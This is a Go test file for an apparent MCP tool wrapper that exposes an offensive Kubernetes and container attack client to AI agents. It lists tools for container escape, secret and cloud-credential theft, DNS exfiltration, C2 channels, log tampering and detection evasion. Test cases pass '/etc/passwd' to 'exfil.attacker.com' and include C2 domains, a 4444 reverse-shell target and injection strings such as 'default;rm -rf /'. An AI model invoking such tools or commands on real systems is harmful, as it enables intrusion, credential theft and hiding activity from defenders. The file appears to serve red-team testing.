package kubedagger

import (
	"context"
	"encoding/json"
	"reflect"
	"strings"
	"testing"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

// allTools returns every tool in the kubedagger package instantiated with
// the given executor. This is the single source of truth for enumerating tools.
func allTools(exec executor.Executor) []mcp.Tool {
	return []mcp.Tool{
		NewNetworkScan(exec),
		NewNetworkDiscovery(exec),
		NewDockerList(exec),
		NewDockerOverride(exec),
		NewK8sDiscover(exec),
		NewK8sAbuse(exec),
		NewContainerEscape(exec),
		NewSecretsHarvest(exec),
		NewCloudMeta(exec),
		NewCloudExfil(exec),
		NewEvasion(exec),
		NewNetBypass(exec),
		NewMeshBypass(exec),
		NewObsPoison(exec),
		NewDNSExfil(exec),
		NewCovertChannel(exec),
		NewWebhook(exec),
		NewDaemonset(exec),
		NewKeyring(exec),
		NewTLSIntercept(exec),
		NewEtcdSteal(exec),
		NewLogTamper(exec),
		NewSyscallBypass(exec),
		NewAuditFilter(exec),
		NewPcapBlind(exec),
		NewPolymorph(exec),
		NewFilelessExec(exec),
		NewXDPShell(exec),
		NewARPSpoof(exec),
		NewKubelet(exec),
		NewVethHijack(exec),
		NewSidecarInject(exec),
		NewSupplyChain(exec),
		NewCRITamper(exec),
		NewSAToken(exec),
		NewPodIdentity(exec),
		NewGitOpsPoison(exec),
		NewCRDBackdoor(exec),
		NewHoneypotDetect(exec),
		NewK8sEventC2(exec),
		NewContainerLogC2(exec),
		NewDoHC2(exec),
		NewTCPStego(exec),
		NewBPFIPC(exec),
		NewSchedStarve(exec),
		NewFaultInject(exec),
		NewCgroupManip(exec),
		NewElectionDisrupt(exec),
		NewCertSabotage(exec),
		NewKeyringMITM(exec),
		NewCoredumpSuppress(exec),
		NewTimeskew(exec),
		NewSigBypass(exec),
		NewFSWatch(exec),
		NewPipeProg(exec),
		NewPostgres(exec),
		NewProctree(exec),
		NewMITREExport(exec),
		NewDetection(exec),
		NewReport(exec),
		NewVAPBackdoor(exec),
		NewOperatorAgents(exec),
		NewOperatorShell(exec),
		NewOperatorModule(exec),
		NewOperatorTasks(exec),
		NewOperatorStatus(exec),
	}
}

func mustJSON(v any) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}

// ---------------------------------------------------------------------------
// Test: All tools have non-empty Name() and Description()
// ---------------------------------------------------------------------------

func TestAllTools_NameAndDescription(t *testing.T) {
	mock := executor.NewMock()
	tools := allTools(mock)

	if len(tools) == 0 {
		t.Fatal("allTools returned zero tools")
	}

	seen := make(map[string]bool)
	for _, tool := range tools {
		name := tool.Name()
		desc := tool.Description()

		if name == "" {
			t.Errorf("tool has empty Name()")
			continue
		}
		if desc == "" {
			t.Errorf("tool %q has empty Description()", name)
		}
		if len(desc) < 10 {
			t.Errorf("tool %q Description() is suspiciously short: %q", name, desc)
		}
		if seen[name] {
			t.Errorf("duplicate tool name: %q", name)
		}
		seen[name] = true
	}

	t.Logf("validated %d tools for Name/Description", len(tools))
}

// ---------------------------------------------------------------------------
// Test: All tools return valid JSON from InputSchema()
// ---------------------------------------------------------------------------

func TestAllTools_InputSchemaValid(t *testing.T) {
	mock := executor.NewMock()
	tools := allTools(mock)

	for _, tool := range tools {
		name := tool.Name()
		schema := tool.InputSchema()

		if len(schema) == 0 {
			t.Errorf("tool %q: InputSchema() returned empty", name)
			continue
		}

		var parsed map[string]any
		if err := json.Unmarshal(schema, &parsed); err != nil {
			t.Errorf("tool %q: InputSchema() is invalid JSON: %v", name, err)
			continue
		}

		// Every schema should declare "type": "object"
		if tp, ok := parsed["type"]; !ok || tp != "object" {
			t.Errorf("tool %q: InputSchema() missing \"type\": \"object\"", name)
		}

		// Every property should declare a type
		if props, ok := parsed["properties"].(map[string]any); ok {
			for prop, body := range props {
				propMap, ok := body.(map[string]any)
				if !ok {
					t.Errorf("tool %q: property %q is not an object", name, prop)
					continue
				}
				if _, ok := propMap["type"]; !ok {
					t.Errorf("tool %q: property %q missing \"type\"", name, prop)
				}
			}
		}

		// Every required field must exist in properties
		if req, ok := parsed["required"].([]any); ok {
			for _, r := range req {
				if _, ok := parsed["properties"].(map[string]any)[r.(string)]; !ok {
					t.Errorf("tool %q: required field %q not declared in properties", name, r)
				}
			}
		}
	}
}

// ---------------------------------------------------------------------------
// Test: Execute with valid params and mock executor (representative sample)
// ---------------------------------------------------------------------------

func TestNetworkScan_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("10.0.0.1:80 OPEN\n10.0.0.1:443 OPEN\n")
	}
	tool := NewNetworkScan(mock)

	params := mustJSON(map[string]any{
		"ip":    "10.0.0.1",
		"port":  "80",
		"range": "100",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "10.0.0.1:80 OPEN") {
		t.Errorf("expected scan output in result, got: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	if call.Binary != "kubedagger-client" {
		t.Errorf("expected binary kubedagger-client, got %q", call.Binary)
	}
	assertExactArgs(t, call.Args, "network_discovery", "scan", "--ip", "10.0.0.1", "--port", "80", "--range", "100")
}

func TestDockerList_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("CONTAINER ID  IMAGE        STATUS\nabc123       nginx:latest Running\n")
	}
	tool := NewDockerList(mock)

	result, err := tool.Execute(context.Background(), mustJSON(map[string]any{}))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "nginx:latest") {
		t.Errorf("expected container listing in result, got: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	assertExactArgs(t, call.Args, "docker", "list")
}

func TestK8sDiscover_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("NAME          READY  STATUS\nnginx-pod-1   1/1    Running\n")
	}
	tool := NewK8sDiscover(mock)

	params := mustJSON(map[string]any{
		"namespace": "kube-system",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "nginx-pod-1") {
		t.Errorf("expected pod listing in result, got: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "Namespace: kube-system") {
		t.Errorf("expected namespace header in result, got: %s", result.Content[0].Text)
	}

	// Real CLI only accepts --namespace (plus -o which we do not pass).
	call := mock.LastCall()
	assertExactArgs(t, call.Args, "k8s", "discover", "--namespace", "kube-system")

	// No namespace given: default to "default" and still pass it explicitly.
	result, err = tool.Execute(context.Background(), mustJSON(map[string]any{}))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	call = mock.LastCall()
	assertExactArgs(t, call.Args, "k8s", "discover", "--namespace", "default")
}

// The pinned kubedagger-client binary exits 0 with empty stdout when
// discovery fails, with the error text on stderr only (see
// testdata/kubedagger/k8s-discover-no-kubeconfig.stderr). Empty stdout with
// a non-empty stderr must surface as an error, while empty stdout with an
// empty stderr is a genuinely empty result and stays a success.
func TestK8sDiscover_EmptyOutputHandling(t *testing.T) {
	t.Run("empty stdout and empty stderr is a successful empty result", func(t *testing.T) {
		mock := executor.NewMock()
		tool := NewK8sDiscover(mock)

		result, err := tool.Execute(context.Background(), mustJSON(map[string]any{"namespace": "default"}))
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if result.IsError {
			t.Fatalf("empty stdout + empty stderr must stay a successful empty result: %s", result.Content[0].Text)
		}
		if !strings.Contains(result.Content[0].Text, "No resources found.") {
			t.Errorf("expected empty-result shape, got: %s", result.Content[0].Text)
		}
	})

	t.Run("whitespace stdout with stderr is an error", func(t *testing.T) {
		mock := executor.NewMock()
		mock.StdoutFn = func(_ string, _ []string) []byte { return []byte("  \n\t") }
		mock.StderrFn = func(_ string, _ []string) []byte {
			return []byte("Error: k8s client init failed: no configuration has been provided")
		}
		tool := NewK8sDiscover(mock)

		result, err := tool.Execute(context.Background(), mustJSON(map[string]any{"namespace": "default"}))
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if !result.IsError {
			t.Fatalf("whitespace-only stdout + stderr must be an error: %s", result.Content[0].Text)
		}
		if !strings.Contains(result.Content[0].Text, "k8s client init failed") {
			t.Errorf("expected stderr text in error, got: %s", result.Content[0].Text)
		}
	})
}

func TestContainerEscape_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("[+] Privileged mode detected\n[+] Docker socket found at /var/run/docker.sock\n")
	}
	tool := NewContainerEscape(mock)

	params := mustJSON(map[string]any{
		"action":    "detect",
		"technique": "all",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "Privileged mode detected") {
		t.Errorf("expected escape detection output, got: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	assertExactArgs(t, call.Args, "escape", "--action", "detect", "--technique", "all")
}

func TestDNSExfil_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("Sent 5 chunks via DNS queries\nExfiltration complete.\n")
	}
	tool := NewDNSExfil(mock)

	params := mustJSON(map[string]any{
		"file":   "/etc/passwd",
		"domain": "exfil.attacker.com",
		"server": "1.1.1.1",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "5 chunks") {
		t.Errorf("expected exfil output, got: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	assertExactArgs(t, call.Args, "dns_exfil", "--file", "/etc/passwd", "--domain", "exfil.attacker.com", "--server", "1.1.1.1")
}

func TestDNSExfil_MissingRequiredParams(t *testing.T) {
	tool := NewDNSExfil(executor.NewMock())

	for _, params := range []json.RawMessage{
		mustJSON(map[string]any{"domain": "exfil.attacker.com"}),
		mustJSON(map[string]any{"file": "/etc/passwd"}),
	} {
		result, err := tool.Execute(context.Background(), params)
		if err != nil {
			t.Fatalf("unexpected Go error: %v", err)
		}
		if !result.IsError {
			t.Error("expected error for missing required param")
		}
	}
}

func TestCloudMeta_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte(`{"AccessKeyId":"AKIAIOSFODNN7EXAMPLE","SecretAccessKey":"wJalrXUtnFEMI"}`)
	}
	tool := NewCloudMeta(mock)

	params := mustJSON(map[string]any{
		"provider": "aws",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "AKIAIOSFODNN7EXAMPLE") {
		t.Errorf("expected AWS credentials in output, got: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "Provider: aws") {
		t.Errorf("expected provider header, got: %s", result.Content[0].Text)
	}

	// Real CLI only accepts --provider.
	call := mock.LastCall()
	assertExactArgs(t, call.Args, "cloud", "meta", "--provider", "aws")
}

func TestSecretsHarvest_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("SECRET: default/db-credentials  type=Opaque  keys=[password, username]\n")
	}
	tool := NewSecretsHarvest(mock)

	params := mustJSON(map[string]any{
		"sources": "k8s",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "db-credentials") {
		t.Errorf("expected secrets output, got: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	assertExactArgs(t, call.Args, "secrets", "harvest", "--sources", "k8s")
}

func TestDockerOverride_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("Override applied successfully\n")
	}
	tool := NewDockerOverride(mock)

	params := mustJSON(map[string]any{
		"action":   "put",
		"from":     "nginx:latest",
		"to":       "evil/nginx:latest",
		"override": 1,
		"ping":     2,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "Override applied") {
		t.Errorf("expected override confirmation, got: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	assertExactArgs(t, call.Args, "docker", "put", "--from", "nginx:latest", "--to", "evil/nginx:latest", "--override", "1", "--ping", "2")

	// delete takes --from only
	result, err = tool.Execute(context.Background(), mustJSON(map[string]any{
		"action": "delete",
		"from":   "nginx:latest",
	}))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	call = mock.LastCall()
	assertExactArgs(t, call.Args, "docker", "delete", "--from", "nginx:latest")
}

func TestDockerOverride_NameValidation(t *testing.T) {
	tool := NewDockerOverride(executor.NewMock())

	tests := []struct {
		name   string
		params map[string]any
	}{
		{"hash_in_from", map[string]any{"from": "nginx#latest"}},
		{"hash_in_to", map[string]any{"from": "a", "to": "b#c"}},
		{"from_too_long", map[string]any{"from": strings.Repeat("a", 64)}},
		{"missing_from", map[string]any{"action": "put"}},
		{"bad_override", map[string]any{"from": "a", "override": 5}},
		{"bad_ping", map[string]any{"from": "a", "ping": 9}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result, err := tool.Execute(context.Background(), mustJSON(tc.params))
			if err != nil {
				t.Fatalf("unexpected Go error: %v", err)
			}
			if !result.IsError {
				t.Errorf("expected validation error, got success")
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Test: Execute with executor error
// ---------------------------------------------------------------------------

func TestNetworkScan_ExecuteError(t *testing.T) {
	mock := executor.NewMock()
	mock.StderrFn = func(_ string, _ []string) []byte {
		return []byte("connection refused")
	}
	mock.ErrFn = func(_ string, _ []string) error {
		return &mockError{"execution timed out"}
	}
	tool := NewNetworkScan(mock)

	params := mustJSON(map[string]any{"ip": "10.0.0.1", "port": "80"})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute should not return Go error, got: %v", err)
	}
	if !result.IsError {
		t.Fatal("expected IsError=true when executor fails")
	}
	if !strings.Contains(result.Content[0].Text, "timed out") {
		t.Errorf("expected timeout message in error, got: %s", result.Content[0].Text)
	}
}

// ---------------------------------------------------------------------------
// Test: Shell metacharacter injection is rejected
// ---------------------------------------------------------------------------

func TestShellMetacharRejection(t *testing.T) {
	// Each forbidden char from validate.go's shellMetachars slice
	forbiddenChars := []string{";", "|", "&", "`", "$", "(", ")", "{", "}", "<", ">", "!", "'", "\"", "\\", "\n", "\r"}

	tests := []struct {
		name   string
		tool   mcp.Tool
		params func(injection string) json.RawMessage
	}{
		{
			name: "NetworkScan_ip",
			tool: NewNetworkScan(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"ip": "10.0.0.1" + inj + "rm -rf /", "port": "80"})
			},
		},
		{
			name: "NetworkScan_port",
			tool: NewNetworkScan(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"ip": "10.0.0.1", "port": "80" + inj + "bad"})
			},
		},
		{
			name: "DockerOverride_from",
			tool: NewDockerOverride(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"from": "abc" + inj + "evil"})
			},
		},
		{
			name: "DockerOverride_to",
			tool: NewDockerOverride(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"from": "abc123", "to": "img" + inj + "bad"})
			},
		},
		{
			name: "DNSExfil_file",
			tool: NewDNSExfil(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"file": "/etc/passwd" + inj + "x", "domain": "exfil.com"})
			},
		},
		{
			name: "DNSExfil_domain",
			tool: NewDNSExfil(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"file": "/etc/passwd", "domain": "evil.com" + inj + "x"})
			},
		},
		{
			name: "DoHC2_domain",
			tool: NewDoHC2(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"domain": "evil.com" + inj + "x"})
			},
		},
		{
			name: "FSWatch_path",
			tool: NewFSWatch(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"action": "add", "path": "/tmp/watch" + inj + "x"})
			},
		},
		{
			name: "PipeProg_program",
			tool: NewPipeProg(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"action": "put", "program": "/tmp/prog" + inj + "x"})
			},
		},
		{
			name: "Postgres_role",
			tool: NewPostgres(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"action": "put", "role": "admin" + inj + "x"})
			},
		},
		{
			name: "Report_events",
			tool: NewReport(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"events": "/tmp/events.jsonl" + inj + "x"})
			},
		},
		{
			name: "VAPBackdoor_label",
			tool: NewVAPBackdoor(executor.NewMock()),
			params: func(inj string) json.RawMessage {
				return mustJSON(map[string]any{"label": "backdoor=true" + inj + "x"})
			},
		},
	}

	for _, tc := range tests {
		for _, char := range forbiddenChars {
			testName := tc.name + "_char_" + charLabel(char)
			t.Run(testName, func(t *testing.T) {
				params := tc.params(char)
				result, err := tc.tool.Execute(context.Background(), params)
				if err != nil {
					t.Fatalf("Execute returned Go error: %v", err)
				}
				if !result.IsError {
					t.Errorf("expected rejection for char %q, but got success", char)
					return
				}
				if !strings.Contains(result.Content[0].Text, "forbidden character") {
					t.Errorf("expected 'forbidden character' in error message, got: %s", result.Content[0].Text)
				}
			})
		}
	}
}

// ---------------------------------------------------------------------------
// Test: Namespace validation rejects invalid namespaces
// ---------------------------------------------------------------------------

func TestNamespaceValidation(t *testing.T) {
	tests := []struct {
		name      string
		namespace string
		wantErr   bool
	}{
		{"valid_simple", "default", false},
		{"valid_with_dash", "kube-system", false},
		{"valid_numbers", "ns123", false},
		{"valid_all", "all", false},
		{"invalid_uppercase", "Default", true},
		{"invalid_underscore", "my_namespace", true},
		{"invalid_dot", "my.namespace", true},
		{"invalid_starts_with_dash", "-invalid", true},
		{"invalid_too_long", strings.Repeat("a", 64), true},
		{"invalid_shell_injection", "default;rm -rf /", true},
		{"empty_is_ok", "", false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			mock := executor.NewMock()
			mock.StdoutFn = func(_ string, _ []string) []byte {
				return []byte("ok")
			}
			tool := NewVAPBackdoor(mock)

			params := mustJSON(map[string]any{"namespace": tc.namespace})
			result, err := tool.Execute(context.Background(), params)
			if err != nil {
				t.Fatalf("Execute returned Go error: %v", err)
			}

			if tc.wantErr && !result.IsError {
				t.Errorf("expected validation error for namespace %q, got success", tc.namespace)
			}
			if !tc.wantErr && result.IsError {
				t.Errorf("expected success for namespace %q, got error: %s", tc.namespace, result.Content[0].Text)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Test: K8sDiscover namespace validation
// ---------------------------------------------------------------------------

func TestK8sDiscover_InvalidNamespace(t *testing.T) {
	mock := executor.NewMock()
	tool := NewK8sDiscover(mock)

	params := mustJSON(map[string]any{
		"namespace": "INVALID_NS",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected Go error: %v", err)
	}
	if !result.IsError {
		t.Error("expected validation error for uppercase namespace")
	}
}

// ---------------------------------------------------------------------------
// Test: Empty/missing required params return errors
// ---------------------------------------------------------------------------

func TestContainerEscape_InvalidJSON(t *testing.T) {
	mock := executor.NewMock()
	tool := NewContainerEscape(mock)

	result, err := tool.Execute(context.Background(), json.RawMessage(`{invalid`))
	if err != nil {
		t.Fatalf("unexpected Go error: %v", err)
	}
	if !result.IsError {
		t.Error("expected error for invalid JSON")
	}
	if !strings.Contains(result.Content[0].Text, "invalid input") {
		t.Errorf("expected 'invalid input' message, got: %s", result.Content[0].Text)
	}
}

func TestDNSExfil_InvalidJSON(t *testing.T) {
	mock := executor.NewMock()
	tool := NewDNSExfil(mock)

	result, err := tool.Execute(context.Background(), json.RawMessage(`not json at all`))
	if err != nil {
		t.Fatalf("unexpected Go error: %v", err)
	}
	if !result.IsError {
		t.Error("expected error for malformed JSON")
	}
}

// ---------------------------------------------------------------------------
// Test: Evasion tool with valid params (previously passed wrong flags)
// ---------------------------------------------------------------------------

func TestEvasion_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("[+] Falco eBPF hooks suppressed\n[+] Event filter installed\n")
	}
	tool := NewEvasion(mock)

	result, err := tool.Execute(context.Background(), mustJSON(map[string]any{
		"mode": "cnative-sensor",
	}))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "Falco eBPF hooks suppressed") {
		t.Errorf("expected evasion output, got: %s", result.Content[0].Text)
	}

	// Real CLI only accepts --mode (no --target/--pid/--scope).
	call := mock.LastCall()
	assertExactArgs(t, call.Args, "evasion", "--mode", "cnative-sensor")

	// No mode: run with CLI default (no flag passed).
	result, err = tool.Execute(context.Background(), mustJSON(map[string]any{}))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	call = mock.LastCall()
	assertExactArgs(t, call.Args, "evasion")
}

// ---------------------------------------------------------------------------
// Test: NetworkDiscovery with valid params
// ---------------------------------------------------------------------------

func TestNetworkDiscovery_Execute(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("10.0.0.5 -> 10.0.0.10:8080 (TCP)\n10.0.0.5 -> 10.0.0.20:443 (TCP)\n")
	}
	tool := NewNetworkDiscovery(mock)

	result, err := tool.Execute(context.Background(), mustJSON(map[string]any{
		"active":  true,
		"passive": true,
	}))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatalf("unexpected tool error: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, "10.0.0.5 -> 10.0.0.10:8080") {
		t.Errorf("expected discovery output, got: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	assertExactArgs(t, call.Args, "network_discovery", "get", "--active", "--passive")
}

// ---------------------------------------------------------------------------
// Test: Empty output produces informative result (not error)
// ---------------------------------------------------------------------------

func TestNetworkScan_EmptyOutput(t *testing.T) {
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("")
	}
	tool := NewNetworkScan(mock)

	params := mustJSON(map[string]any{"ip": "10.0.0.1", "port": "80"})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatal("empty output should not be an error")
	}
	if !strings.Contains(result.Content[0].Text, "No results") {
		t.Errorf("expected 'No results' message, got: %s", result.Content[0].Text)
	}
}

// ---------------------------------------------------------------------------
// Test: validateSafeString with oversized input
// ---------------------------------------------------------------------------

func TestValidateSafeString_TooLong(t *testing.T) {
	longInput := strings.Repeat("a", 4097)
	mock := executor.NewMock()
	tool := NewNetworkScan(mock)

	params := mustJSON(map[string]any{"ip": longInput, "port": "80"})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("unexpected Go error: %v", err)
	}
	if !result.IsError {
		t.Error("expected rejection for input exceeding 4096 chars")
	}
	if !strings.Contains(result.Content[0].Text, "too long") {
		t.Errorf("expected 'too long' message, got: %s", result.Content[0].Text)
	}
}

// ---------------------------------------------------------------------------
// Test: Fixed arg construction for previously-drifted technique commands
// ---------------------------------------------------------------------------

func TestTechniqueCommandArgs(t *testing.T) {
	tests := []struct {
		name      string
		params    map[string]any
		wantArgs  []string
		wantError bool
	}{
		{
			name:     "sa_token_mint",
			params:   map[string]any{"action": "mint", "service_account": "admin", "namespace": "kube-system", "audience": "api"},
			wantArgs: []string{"sa-token", "--action", "mint", "--service-account", "admin", "--namespace", "kube-system", "--audience", "api"},
		},
		{
			name:     "k8s_abuse",
			params:   map[string]any{"action": "dump-secrets", "token": "tok", "namespace": "default"},
			wantArgs: []string{"k8s", "abuse", "--action", "dump-secrets", "--token", "tok", "--namespace", "default"},
		},
		{
			name:     "vap_backdoor",
			params:   map[string]any{"namespace": "all", "label": "kd=true"},
			wantArgs: []string{"vap_backdoor", "--namespace", "all", "--label", "kd=true"},
		},
		{
			name:     "xdp_shell",
			params:   map[string]any{"connect": "10.0.0.1:4444", "protocol": "icmp"},
			wantArgs: []string{"xdp-shell", "--connect", "10.0.0.1:4444", "--protocol", "icmp"},
		},
		{
			name:     "bpf_ipc",
			params:   map[string]any{"action": "send", "channel": "c2", "message": "hello"},
			wantArgs: []string{"bpf-ipc", "--action", "send", "--channel", "c2", "--message", "hello"},
		},
		{
			name:     "k8s_event_c2",
			params:   map[string]any{"namespace": "kube-system", "beacon": "45s"},
			wantArgs: []string{"k8s-event-c2", "--namespace", "kube-system", "--beacon", "45s"},
		},
		{
			name:     "container_log_c2",
			params:   map[string]any{"container": "nginx", "encoding": "whitespace"},
			wantArgs: []string{"container-log-c2", "--container", "nginx", "--encoding", "whitespace"},
		},
		{
			name:     "doh_c2",
			params:   map[string]any{"resolver": "google", "domain": "c2.evil.com"},
			wantArgs: []string{"doh-c2", "--domain", "c2.evil.com", "--resolver", "google"},
		},
		{
			name:     "tcp_stego",
			params:   map[string]any{"data": "payload", "dest": "10.0.0.1:8080", "bits_per_packet": "4"},
			wantArgs: []string{"tcp-stego", "--data", "payload", "--dest", "10.0.0.1:8080", "--bits-per-packet", "4"},
		},
		{
			name:     "etcd_steal",
			params:   map[string]any{"mode": "steal-certs", "key_prefix": "/registry/secrets"},
			wantArgs: []string{"etcd-steal", "--mode", "steal-certs", "--key-prefix", "/registry/secrets"},
		},
		{
			name:     "keyring",
			params:   map[string]any{"mode": "watch", "key_type": "user"},
			wantArgs: []string{"keyring", "--mode", "watch", "--key-type", "user"},
		},
		{
			name:     "keyring_mitm",
			params:   map[string]any{"target_key_type": "logon", "replace_with": "/tmp/key"},
			wantArgs: []string{"keyring-mitm", "--target-key-type", "logon", "--replace-with", "/tmp/key"},
		},
		{
			name:     "pod_identity",
			params:   map[string]any{"target_pod": "api", "namespace": "prod", "action": "impersonate"},
			wantArgs: []string{"pod-identity", "--target-pod", "api", "--namespace", "prod", "--action", "impersonate"},
		},
		{
			name:     "sched_starve",
			params:   map[string]any{"target_cgroup": "/kubepods/burstable", "intensity": "high"},
			wantArgs: []string{"sched-starve", "--target-cgroup", "/kubepods/burstable", "--intensity", "high"},
		},
		{
			name:     "fault_inject",
			params:   map[string]any{"target_pids": "123,456", "syscalls": "read,write", "error_rate": "50", "errno": "ENOMEM"},
			wantArgs: []string{"fault-inject", "--target-pids", "123,456", "--syscalls", "read,write", "--error-rate", "50", "--errno", "ENOMEM"},
		},
		{
			name:     "cgroup_manip",
			params:   map[string]any{"target_pod": "api-0", "resource": "cpu", "action": "freeze"},
			wantArgs: []string{"cgroup-manip", "--target-pod", "api-0", "--resource", "cpu", "--action", "freeze"},
		},
		{
			name:     "election_disrupt",
			params:   map[string]any{"target": "controller-manager", "mode": "oscillate"},
			wantArgs: []string{"election-disrupt", "--target", "controller-manager", "--mode", "oscillate"},
		},
		{
			name:     "cert_sabotage",
			params:   map[string]any{"mode": "inject", "cert_target": "etcd"},
			wantArgs: []string{"cert-sabotage", "--mode", "inject", "--cert-target", "etcd"},
		},
		{
			name:     "coredump_suppress",
			params:   map[string]any{"pids": "42,43"},
			wantArgs: []string{"coredump-suppress", "--pids", "42,43"},
		},
		{
			name:     "timeskew",
			params:   map[string]any{"pids": "42", "offset": "-7200", "mode": "freeze"},
			wantArgs: []string{"timeskew", "--pids", "42", "--offset", "-7200", "--mode", "freeze"},
		},
		{
			name:     "log_tamper",
			params:   map[string]any{"mode": "modify", "pattern": "audit-log-line", "log_target": "journald"},
			wantArgs: []string{"log-tamper", "--mode", "modify", "--pattern", "audit-log-line", "--log-target", "journald"},
		},
		{
			name:     "syscall_bypass",
			params:   map[string]any{"hide_pids": "1,2", "hide_files": "/tmp/a,/tmp/b", "hide_ports": "4444,8080"},
			wantArgs: []string{"syscall-bypass", "--hide-pids", "1,2", "--hide-files", "/tmp/a,/tmp/b", "--hide-ports", "4444,8080"},
		},
		{
			name:     "audit_filter",
			params:   map[string]any{"mode": "replay", "pids": "99"},
			wantArgs: []string{"audit-filter", "--mode", "replay", "--pids", "99"},
		},
		{
			name:     "pcap_blind",
			params:   map[string]any{"hide_ports": "4444", "hide_ips": "10.0.0.1,10.0.0.2"},
